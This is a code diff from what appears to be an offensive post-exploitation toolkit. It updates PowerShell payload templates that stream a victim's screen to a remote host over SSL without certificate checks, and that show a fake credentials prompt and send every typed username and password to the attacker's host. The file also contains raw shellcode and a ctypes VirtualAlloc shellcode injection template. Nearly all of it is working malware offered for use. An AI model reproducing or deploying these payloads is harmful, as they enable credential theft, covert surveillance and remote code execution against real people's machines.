@@ -156,33 +156,37 @@ class SHELLCODE(object):
         "\xc8\x5f\xff\xd5\x01\xc3\x29\xc6\x75\xee\xc3")
 
     windows_ps_rev_watch_screen = (
-        "while ($true){try{Add-Type -AssemblyName System.Windows.Forms;"
-        "[System.IO.MemoryStream];$MemoryStream = New-Object System.IO.MemoryStream;"
-        "$socket = New-Object System.Net.Sockets.Socket ([System.Net.Sockets.AddressFamily]::InterNetwork, [System.Net.Sockets.SocketType]::Stream, [System.Net.Sockets.ProtocolType]::Tcp);$socket.Connect('%s','%s');"
-        "function SendResponse($sock, $string){if ($sock.Connected){$bytesSent = $sock.Send($string);"
-        "if ( $bytesSent -eq -1 ){Write-Output \"Send failed to \" + $sock.RemoteEndPoint}}}function SendStrResponse($sock, $string){if ($sock.Connected){$bytesSent = $sock.Send([text.Encoding]::Ascii.GetBytes($string));"
-        "if ( $bytesSent -eq -1 ){Write-Output (\"Send failed to \" + $sock.RemoteEndPoint)}}};"
-        "function SendHeader([net.sockets.socket] $sock,$length,$statusCode = \"200 OK\",$mimeHeader=\"text/html\",$httpVersion=\"HTTP/1.1\"){$response = \"HTTP/1.1 $statusCode`r`n\" + \"Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n\";SendStrResponse $sock $response;Write-Verbose \"Header sent to $IPAddress\"};"
-        "SendHeader $socket;while ($True){$b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
+        "Add-Type -AssemblyName System.Windows.Forms;[System.IO.MemoryStream] $MemoryStream = New-Object System.IO.MemoryStream;"
+        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
+        "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
+        "$ssl.AuthenticateAsClient($env:computername);function SendResponse($sock, $string){$bytesSent = $sock.Write($string)};"
+        "function SendStrResponse($sock, $string){$bytesSent = $sock.Write([text.Encoding]::Ascii.GetBytes($string))};"
+        "function SendHeader($sock,$length,$statusCode = \"200 OK\",$mimeHeader=\"text/html\",$httpVersion=\"HTTP/1.1\"){$response = \"HTTP/1.1 $statusCode`r`n\" + \"Content-Type: multipart/x-mixed-replace; boundary=--boundary`r`n`n\";"
+        "SendStrResponse $sock $response;}SendHeader $ssl;"
+        "While ($client.Connected){$b = New-Object System.Drawing.Bitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Width, [System.Windows.Forms.Screen]::PrimaryScreen.Bounds.Height);"
         "$g = [System.Drawing.Graphics]::FromImage($b);"
-        "$g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size);$g.Dispose();"
-        "$MemoryStream.SetLength(0);$b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg));"
+        "$g.CopyFromScreen((New-Object System.Drawing.Point(0,0)), (New-Object System.Drawing.Point(0,0)), $b.Size);"
+        "$g.Dispose();$MemoryStream.SetLength(0);$b.Save($MemoryStream, ([system.drawing.imaging.imageformat]::jpeg));"
         "$b.Dispose();$length = $MemoryStream.Length;[byte[]] $Bytes = $MemoryStream.ToArray();"
         "$str = \"`n`n--boundary`n\" + \"Content-Type: image/jpeg`n\" + \"Content-Length: $length`n`n\";"
-        "SendStrResponse $socket $str;SendResponse $socket $Bytes}$MemoryStream.Close()}catch{Write-Warning \"Something went wrong!\"; Write-Error $_}}")
+        "SendStrResponse $ssl $str;SendResponse $ssl $Bytes};$MemoryStream.Close()")
 
     windows_ps_ask_creds_tcp = (
+        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
+        "$ssl = New-Object System.Net.Security.SslStream $stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]);"
+        "$ssl.AuthenticateAsClient($env:computername);"
         "$ErrorActionPreference=\"SilentlyContinue\";Add-Type -assemblyname system.DirectoryServices.accountmanagement;"
         "$DS = New-Object System.DirectoryServices.AccountManagement.PrincipalContext([System.DirectoryServices.AccountManagement.ContextType]::Machine);"
         "$domainDN = \"LDAP://\" + ([ADSI]\"\").distinguishedName;"
         "while($true){$credential = $host.ui.PromptForCredential(\"Credentials are required to perform this operation!\", \"\", \"\", \"\");"
-        "if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String];"
-        "$pass = $creds.password;[String]$domain = $creds.domain;$authlocal = $DS.ValidateCredentials($user, $pass);"
+        "if($credential){$creds = $credential.GetNetworkCredential();[String]$user = $creds.username;[String];$pass = $creds.password;"
+        "$send = ([text.encoding]::ASCII).GetBytes('>> INCORRECT -- ' + 'Username: ' + $user + ' Password: ' + $pass);"
+        "$ssl.Write($send,0,$send.Length);"
+        "[String]$domain = $creds.domain;$authlocal = $DS.ValidateCredentials($user, $pass);"
         "$authdomain = New-Object System.DirectoryServices.DirectoryEntry($domainDN,$user,$pass);"
-        "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){$output = \"Username: \" + $user + \" Password: \" + $pass + \" Domain:\" + $domain + \" Domain:\"+ $authdomain.name8;"
-        "$client = New-Object System.Net.Sockets.TCPClient('%s','%s');$stream = $client.GetStream();"
-        "$send = ([text.encoding]::ASCII).GetBytes('='*30 + $output + '='*30);"
-        "$stream.Write($send,0,$send.Length);Exit}}}")
+        "if(($authlocal -eq $true) -or ($authdomain.name -ne $null)){"
+        "$send = ([text.encoding]::ASCII).GetBytes('>> CORRECT -- ' + 'Username: ' + $user + ' Password: ' + $pass);"
+        "$ssl.Write($send,0,$send.Length);Exit}}}")
 
     injectwindows = """shellcode = bytearray('%s')
 ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
